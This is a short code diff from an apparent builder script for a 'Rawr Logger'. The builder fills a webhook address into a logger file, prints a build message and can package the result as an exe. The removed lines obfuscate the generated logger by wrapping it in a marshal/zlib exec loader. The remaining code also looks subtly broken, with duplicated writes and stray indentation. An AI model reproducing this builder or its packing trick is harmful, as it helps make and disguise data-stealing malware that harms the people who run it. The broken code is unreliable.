@@ -27,13 +27,6 @@ with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(code.text.replace("webhooker", webhook))
     f.write(code.text.replace("lollll", name))
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.green_to_blue, interval=0.01)
-prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Contine",Colors.green_to_blue, interval=0.01)
-with open(f'{name}.py') as fi:
-    pro = fi.read()
-    mar = marshal.dumps(pro)
-    zlb = zlib.compress(mar)
-    with open(f"{name}.py", 'w') as f:
-        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_blue, interval=0.01)
     if compile == "y":
         os.system(f'pyinstaller --onefile  {name}.py')
